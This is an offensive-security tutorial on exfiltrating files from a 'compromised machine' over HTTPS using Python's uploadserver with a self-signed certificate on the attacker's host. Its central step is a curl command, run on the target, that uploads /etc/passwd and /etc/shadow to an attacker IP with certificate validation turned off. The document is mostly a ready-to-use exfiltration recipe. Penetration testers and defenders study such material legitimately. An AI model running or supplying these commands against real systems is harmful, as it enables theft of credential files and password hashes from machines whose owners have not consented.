Use Pythonâ€™s `uploadserver` module to **securely upload files** from a compromised machine over HTTPS. Perfect for environments where HTTP is blocked or when encryption is required.

---

## **1. Install `uploadserver` (Attacker Machine)**

Run:

```bash
sudo python3 -m pip install --user uploadserver
```

Example output:

```
Collecting uploadserver
Successfully installed uploadserver-2.0.1
```

---

## **2. Create a Self-Signed Certificate (Attacker Machine)**

Generate a quick self-signed certificate:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

This creates a file named `server.pem` that contains both the certificate and key.

---

## **3. Create a Directory for Your Server (Attacker Machine)**

Keep your uploads organized:

```bash
mkdir https && cd https
```

---

## **4. Start the HTTPS Upload Server (Attacker Machine)**

Run the server on port 443:

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Example output:

```
File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

---

## **5. Upload Files from Target Machine**

Use `curl` to upload files over HTTPS.  
Example for uploading `/etc/passwd` and `/etc/shadow`:

```bash
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

**Why `--insecure`?**  
Because the certificate is self-signed. This flag tells `curl` to skip certificate validation.

---

## **Tips**

- Always verify the IP and port match your server setup.
    
- Use a proper certificate for production environments to avoid `--insecure`.
    
- Works for both Linux and Windows targets if `curl` or similar tools are available.
